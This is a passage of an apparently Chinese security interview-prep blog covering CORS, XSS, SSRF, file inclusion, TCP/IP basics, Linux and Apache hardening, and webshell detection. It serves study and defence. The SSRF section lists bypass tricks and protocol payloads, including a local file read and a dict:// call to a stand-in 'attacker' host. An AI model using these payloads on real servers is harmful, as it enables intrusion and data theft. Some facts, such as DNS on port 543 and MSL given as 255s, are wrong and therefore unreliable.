Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p></blockquote><h5 id="-71"><a href="#-71" class="headerlink" title=""></a></h5><h5 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h5>CORS与JSONP的使用目的相同，但是比JSONP更强大。<br>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。<h3 id="-72"><a href="#-72" class="headerlink" title=""></a></h3><h3 id="DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？"><a href="#DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？" class="headerlink" title="DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？"></a>DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</h3><blockquote><p><a href="https://www.zhihu.com/question/26628342" target="_blank" rel="noopener">https://www.zhihu.com/question/26628342</a><br>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；<br>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；<br>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p></blockquote><h3 id="-73"><a href="#-73" class="headerlink" title=""></a></h3><h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><blockquote><p><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">https://www.zhihu.com/question/21979782</a> 浏览器内容安全策略，减少xss攻击。</p></blockquote><h3 id="-74"><a href="#-74" class="headerlink" title=""></a></h3><h3 id="SSRF漏洞原理是什么？利用时有哪些伪协议？"><a href="#SSRF漏洞原理是什么？利用时有哪些伪协议？" class="headerlink" title="SSRF漏洞原理是什么？利用时有哪些伪协议？"></a>SSRF漏洞原理是什么？利用时有哪些伪协议？</h3><blockquote><p>secpulse.com/archives/65832.html</p></blockquote><h4 id="-75"><a href="#-75" class="headerlink" title=""></a></h4><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。<h4 id="-76"><a href="#-76" class="headerlink" title=""></a></h4><h4 id="ssrf用处"><a href="#ssrf用处" class="headerlink" title="ssrf用处"></a>ssrf用处</h4></li><li>探测内网信息,用协议探<code>ftp%26ip={ip}%26port={port}</code></li><li>攻击内网或本地其他服务</li><li>穿透防火墙<h4 id="-77"><a href="#-77" class="headerlink" title=""></a></h4><h4 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处"></a>漏洞处</h4></li><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具<br>举几个例子：</li><li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li><li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li><li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。<h4 id="-78"><a href="#-78" class="headerlink" title=""></a></h4><h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4></li><li><code>http://example.com@127.0.0.1</code></li><li>利用IP地址的省略写法绕过,[::]绕过localhost</li><li>DNS解析 <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a>  可以指向任意ip的域名：xip.io</li><li>利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过<h4 id="-79"><a href="#-79" class="headerlink" title=""></a></h4><h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><blockquote><p><a href="https://www.secpulse.com/archives/70471.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/70471.html</a><br>接受ua为curl的时候，支持的协议有 <a href="https://camo.githubusercontent.com/f8aaaa140f6d6dab5d160188c330b7bae0768ab6/68747470733a2f2f7777772e73656370756c73652e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031382f30342f31353233353035363435312e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/f8aaaa140f6d6dab5d160188c330b7bae0768ab6/68747470733a2f2f7777772e73656370756c73652e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031382f30342f31353233353035363435312e706e67" alt="img"></a><br>使用<code>curl -v http://xx.com/ssrf.php?url=sxxx</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password</span><br><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h4 id="-80"><a href="#-80" class="headerlink" title=""></a></h4><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><blockquote><p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p></blockquote></li><li>检查是否为内网IP地址 绕过方法: 利用八进制IP地址绕过 利用十六进制IP地址绕过 利用十进制的IP地址绕过 利用IP地址的省略写法绕过 最好的做法：IP地址转换为整数再进行判断</li><li>获取真正请求的host<ol><li>如何正确的获取用户输入的URL的Host？ 最常见的就是，使用<a href="http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname" target="_blank" rel="noopener">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname</a></li><li>只要Host只要不是内网IP即可吗？ host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查</li><li>只要Host指向的IP不是内网IP即可吗？ 不一定，可能会30x跳转<br>归纳 解析目标URL，获取其Host 解析Host，获取Host指向的IP地址 检查IP地址是否为内网IP 请求URL 如果有跳转，拿出跳转URL，执行1<h3 id="-81"><a href="#-81" class="headerlink" title=""></a></h3><h3 id="在浏览器端，Referer可以篡改吗？"><a href="#在浏览器端，Referer可以篡改吗？" class="headerlink" title="在浏览器端，Referer可以篡改吗？"></a>在浏览器端，Referer可以篡改吗？</h3>通过插件修改，一般抓包修改<h3 id="-82"><a href="#-82" class="headerlink" title=""></a></h3><h3 id="xss盲打到内网服务器的利用"><a href="#xss盲打到内网服务器的利用" class="headerlink" title="xss盲打到内网服务器的利用"></a>xss盲打到内网服务器的利用</h3><h3 id="-83"><a href="#-83" class="headerlink" title=""></a></h3><h3 id="xss代码层防御"><a href="#xss代码层防御" class="headerlink" title="xss代码层防御"></a>xss代码层防御</h3><h2 id="-84"><a href="#-84" class="headerlink" title=""></a></h2><h2 id="文件上传下载遍历漏洞"><a href="#文件上传下载遍历漏洞" class="headerlink" title="文件上传下载遍历漏洞"></a>文件上传下载遍历漏洞</h2><h3 id="-85"><a href="#-85" class="headerlink" title=""></a></h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3></li></ol></li><li>容器漏洞，解析漏洞<h3 id="-86"><a href="#-86" class="headerlink" title=""></a></h3><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h2 id="-87"><a href="#-87" class="headerlink" title=""></a></h2><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote><p><a href="https://blog.csdn.net/fuckcat_2333/article/details/52132559" target="_blank" rel="noopener">https://blog.csdn.net/fuckcat_2333/article/details/52132559</a></p></blockquote><h3 id="-88"><a href="#-88" class="headerlink" title=""></a></h3><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3></li><li>本地文件包含</li><li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。<h3 id="-89"><a href="#-89" class="headerlink" title=""></a></h3><h3 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h3></li><li><code>include()</code> ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li><li><code>inclue_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</li><li><code>require()</code>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li><li><code>require_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。<h3 id="-90"><a href="#-90" class="headerlink" title=""></a></h3><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3></li><li>读取敏感文件</li><li>远程包含shell</li><li>图片上传并包含图片shenll</li><li>使用伪协议</li><li>包含日志文件GetShell</li><li>截断包含<h3 id="-91"><a href="#-91" class="headerlink" title=""></a></h3><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3></li><li>禁止远程文件包含 <code>allow_url_include=off</code></li><li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li><li>过滤<code>../</code>等特殊符号</li><li>修改Apache日志文件的存放地址</li><li>开启魔术引号 <code>magic_quotes_qpc=on</code></li><li>尽量不要使用动态变量调用文件，直接写要包含的文件。<h2 id="-92"><a href="#-92" class="headerlink" title=""></a></h2><h2 id="web框架漏洞弱点"><a href="#web框架漏洞弱点" class="headerlink" title="web框架漏洞弱点"></a>web框架漏洞弱点</h2><h3 id="-93"><a href="#-93" class="headerlink" title=""></a></h3><h3 id="服务端注入之Flask框架中服务端模板注入问题"><a href="#服务端注入之Flask框架中服务端模板注入问题" class="headerlink" title="服务端注入之Flask框架中服务端模板注入问题"></a>服务端注入之Flask框架中服务端模板注入问题</h3><blockquote><p><a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a></p></blockquote><h2 id="-94"><a href="#-94" class="headerlink" title=""></a></h2><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="-95"><a href="#-95" class="headerlink" title=""></a></h3><h3 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h3><h4 id="-96"><a href="#-96" class="headerlink" title=""></a></h4><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4></li><li>客户端 syn 发送到服务端，变成 SYN_SENT 状态</li><li>服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态</li><li>客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端</li><li>服务端收到ACK后变成ESTABLISHED状态，建立连接<br>SYN标志位为表示请求连接，ACK表示确认<h4 id="-97"><a href="#-97" class="headerlink" title=""></a></h4><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4>客户端=主动关闭方</li><li>客户端FIN-&gt;服务端</li><li>服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭</li><li>服务端FIN-&gt;客户端</li><li>客户端ACK=FIN+1-&gt;服务端<br>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！<blockquote><p>MSL=最大段寿命=TTL=最大生存时间=255s</p></blockquote><h3 id="-98"><a href="#-98" class="headerlink" title=""></a></h3><h3 id="四层模型"><a href="#四层模型" class="headerlink" title="四层模型"></a>四层模型</h3></li><li>应用层 应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.</li><li>传输层 传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP). TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.</li><li>网际互联层 网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。 IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。</li><li>网络接入层（即主机-网络层） 网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。<h3 id="-99"><a href="#-99" class="headerlink" title=""></a></h3><h3 id="当你输入一个网址，点击访问，会发生什么？"><a href="#当你输入一个网址，点击访问，会发生什么？" class="headerlink" title="当你输入一个网址，点击访问，会发生什么？"></a>当你输入一个网址，点击访问，会发生什么？</h3><h4 id="-100"><a href="#-100" class="headerlink" title=""></a></h4><h4 id="查找DNS记录"><a href="#查找DNS记录" class="headerlink" title="查找DNS记录"></a>查找DNS记录</h4></li><li>查看浏览器缓存</li><li>查看系统缓存</li><li>查看路由器缓存</li><li>查找ISP DNS缓存</li><li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP<h4 id="-101"><a href="#-101" class="headerlink" title=""></a></h4><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4></li><li>跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文</li><li><h3 id="-102"><a href="#-102" class="headerlink" title=""></a></h3><h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><h3 id="-103"><a href="#-103" class="headerlink" title=""></a></h3><h3 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h3>物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)<h4 id="-104"><a href="#-104" class="headerlink" title=""></a></h4><h4 id="OSI四层"><a href="#OSI四层" class="headerlink" title="OSI四层"></a>OSI四层</h4><h2 id="-105"><a href="#-105" class="headerlink" title=""></a></h2><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><h3 id="-106"><a href="#-106" class="headerlink" title=""></a></h3><h3 id="你搭建过的最复杂的网络设备是什么"><a href="#你搭建过的最复杂的网络设备是什么" class="headerlink" title="你搭建过的最复杂的网络设备是什么"></a>你搭建过的最复杂的网络设备是什么</h3><h3 id="-107"><a href="#-107" class="headerlink" title=""></a></h3><h3 id="使用过什么硬件设备"><a href="#使用过什么硬件设备" class="headerlink" title="使用过什么硬件设备"></a>使用过什么硬件设备</h3><h2 id="-108"><a href="#-108" class="headerlink" title=""></a></h2><h2 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h2><h3 id="-109"><a href="#-109" class="headerlink" title=""></a></h3><h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><h3 id="-110"><a href="#-110" class="headerlink" title=""></a></h3><h3 id="Linux基线规范"><a href="#Linux基线规范" class="headerlink" title="Linux基线规范"></a>Linux基线规范</h3>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面<h4 id="-111"><a href="#-111" class="headerlink" title=""></a></h4><h4 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h4></li></ol><ul><li>检查特殊账号，是否存在空密码的账户和root权限账户</li><li>禁用或删除无用账号</li><li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li><li>禁止root远程登录，限制root用户直接登录。</li><li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code><h4 id="-112"><a href="#-112" class="headerlink" title=""></a></h4><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4></li><li>关闭不必要的服务</li><li>SSH服务安全<ul><li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li><li>修改SSH使用的协议版本为2</li><li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code><h4 id="-113"><a href="#-113" class="headerlink" title=""></a></h4><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4></li></ul></li><li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li><li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code><h4 id="-114"><a href="#-114" class="headerlink" title=""></a></h4><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4></li><li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li><li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a><h4 id="-115"><a href="#-115" class="headerlink" title=""></a></h4><h4 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h4></li><li>远程登录取消telnet采用ssh</li><li>设置/etc/hosts.allow和deny</li><li>禁止ICMP重定向</li><li>禁止源路由转发</li><li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)<h3 id="-116"><a href="#-116" class="headerlink" title=""></a></h3><h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h3><blockquote><p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p></blockquote><h4 id="-117"><a href="#-117" class="headerlink" title=""></a></h4><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4></li><li>账号</li><li>授权</li><li>日志</li><li>session过期时间（防ddos</li><li>绑定监听地址<h4 id="-118"><a href="#-118" class="headerlink" title=""></a></h4><h4 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h4></li><li>目录权限</li><li>访问外部文件</li><li>CGI</li><li>非法HTTP方法（PUT DELETE）<h4 id="-119"><a href="#-119" class="headerlink" title=""></a></h4><h4 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h4></li><li>服务版本号</li><li>重定向错误页面<h4 id="-120"><a href="#-120" class="headerlink" title=""></a></h4><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4></li><li>配置文件</li><li>默认安装的无用文件<h3 id="-121"><a href="#-121" class="headerlink" title=""></a></h3><h3 id="webshell检测思路"><a href="#webshell检测思路" class="headerlink" title="webshell检测思路"></a>webshell检测思路</h3><blockquote><p><a href="https://blog.csdn.net/u011066706/article/details/51175971" target="_blank" rel="noopener">https://blog.csdn.net/u011066706/article/details/51175971</a><br>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。<br>黑客通过浏览器以HTTP协议访问Web  Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p></blockquote><h4 id="-122"><a href="#-122" class="headerlink" title=""></a></h4><h4 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h4>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。<br>优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。<br>静态检测配合人工<br>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a><h4 id="-123"><a href="#-123" class="headerlink" title=""></a></h4><h4 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h4>Linux下就是nobody用户起了bash，Win下就是IIS  User启动cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent和IDS都可以抓现行。Webshell总有一个HTTP请求，如果我在网络层监控HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。<br>缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。<h4 id="-124"><a href="#-124" class="headerlink" title=""></a></h4><h4 id="日志检测"><a href="#日志检测" class="headerlink" title="日志检测"></a>日志检测</h4>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。<h4 id="-125"><a href="#-125" class="headerlink" title=""></a></h4><h4 id="语法检测"><a href="#语法检测" class="headerlink" title="语法检测"></a>语法检测</h4>实现关键危险函数的捕捉方式<h4 id="-126"><a href="#-126" class="headerlink" title=""></a></h4><h4 id="统计学检测"><a href="#统计学检测" class="headerlink" title="统计学检测"></a>统计学检测</h4>webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。 典型的代表: NeoPI – <a href="https://github.com/Neohapsis/NeoPI" target="_blank" rel="noopener">https://github.com/Neohapsis/NeoPI</a><h4 id="-127"><a href="#-127" class="headerlink" title=""></a></h4><h4 id="防范webshell"><a href="#防范webshell" class="headerlink" title="防范webshell"></a>防范webshell</h4><blockquote><p><a href="https://blog.csdn.net/nohaoye/article/details/46987587" target="_blank" rel="noopener">https://blog.csdn.net/nohaoye/article/details/46987587</a><br>防范的措施大概有三种，第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p></blockquote><h3 id="-128"><a href="#-128" class="headerlink" title=""></a></h3><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><blockquote><p><a href="https://blog.csdn.net/kx_nullpointer/article/details/21299873" target="_blank" rel="noopener">https://blog.csdn.net/kx_nullpointer/article/details/21299873</a></p></blockquote></li></ul><ol><li><code>at</code></li><li><code>batch</code></li><li><code>crontab</code></li><li><code>anacron</code>：检测停机期间应该执行但是没有执行的任务，将检测到的任务检测一次<h3 id="-129"><a href="#-129" class="headerlink" title=""></a></h3><h3 id="自动化运维编写过什么脚本"><a href="#自动化运维编写过什么脚本" class="headerlink" title="自动化运维编写过什么脚本"></a>自动化运维编写过什么脚本</h3><h3 id="-130"><a href="#-130" class="headerlink" title=""></a></h3><h3 id="yum用的什么源（本地自搭，挂载）"><a href="#yum用的什么源（本地自搭，挂载）" class="headerlink" title="yum用的什么源（本地自搭，挂载）"></a>yum用的什么源（本地自搭，挂载）</h3><h3 id="-131"><a href="#-131" class="headerlink" title=""></a></h3><h3 id="awk-sed的使用"><a href="#awk-sed的使用" class="headerlink" title="awk sed的使用"></a>awk sed的使用</h3><h3 id="-132"><a href="#-132" class="headerlink" title=""></a></h3><h3 id="排错思路，排错经验"><a href="#排错思路，排错经验" class="headerlink" title="排错思路，排错经验"></a>排错思路，排错经验</h3>网络 防火墙 配置 权限<h3 id="-133"><a href="#-133" class="headerlink" title=""></a></h3><h3 id="日志分析ELK的使用和分析"><a href="#日志分析ELK的使用和分析" class="headerlink" title="日志分析ELK的使用和分析"></a>日志分析ELK的使用和分析</h3><blockquote><p><a href="https://www.zhihu.com/question/21427267" target="_blank" rel="noopener">https://www.zhihu.com/question/21427267</a></p></blockquote></li></ol><ul><li>Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</li><li>Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。</li><li>Kibana 也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。<br>举例-阿里规范 用户历史命令记录<br>缺点：安全性不够。使用x-pack实现安全认证及权限管理功能<h4 id="-134"><a href="#-134" class="headerlink" title=""></a></h4><h4 id="事件发生的分析"><a href="#事件发生的分析" class="headerlink" title="事件发生的分析"></a>事件发生的分析</h4><h3 id="-135"><a href="#-135" class="headerlink" title=""></a></h3><h3 id="用户权限管理-修改"><a href="#用户权限管理-修改" class="headerlink" title="用户权限管理(修改)"></a>用户权限管理(修改)</h3><h3 id="-136"><a href="#-136" class="headerlink" title=""></a></h3><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h3 id="-137"><a href="#-137" class="headerlink" title=""></a></h3><h3 id="IPsec-VPN"><a href="#IPsec-VPN" class="headerlink" title="IPsec VPN"></a>IPsec VPN</h3><h3 id="-138"><a href="#-138" class="headerlink" title=""></a></h3><h3 id="安全监控工具"><a href="#安全监控工具" class="headerlink" title="安全监控工具"></a>安全监控工具</h3></li><li>web进入-&gt;堡垒机-&gt;内部防御HIDS-&gt;内部监控，日志审计</li><li>zabbix性能监控工具</li><li>HIDS<h3 id="-139"><a href="#-139" class="headerlink" title=""></a></h3><h3 id="Linux木马查杀"><a href="#Linux木马查杀" class="headerlink" title="Linux木马查杀"></a>Linux木马查杀</h3><h3 id="-140"><a href="#-140" class="headerlink" title=""></a></h3><h3 id="常见的设备有啥"><a href="#常见的设备有啥" class="headerlink" title="常见的设备有啥"></a>常见的设备有啥</h3></li><li>防火墙 utm 负载均衡设备</li><li>IPS IDS(HIDS基于主机型入侵检测系统)</li><li>堡垒机</li><li>蜜罐</li><li>网闸</li><li>waf</li><li>扫描器</li><li>soc(ossim开源安全信息管理系统)<h2 id="-141"><a href="#-141" class="headerlink" title=""></a></h2><h2 id="Windows运维"><a href="#Windows运维" class="headerlink" title="Windows运维"></a>Windows运维</h2><h3 id="-142"><a href="#-142" class="headerlink" title=""></a></h3><h3 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h3><h3 id="-143"><a href="#-143" class="headerlink" title=""></a></h3><h3 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h3>脱壳，反汇编<h3 id="-144"><a 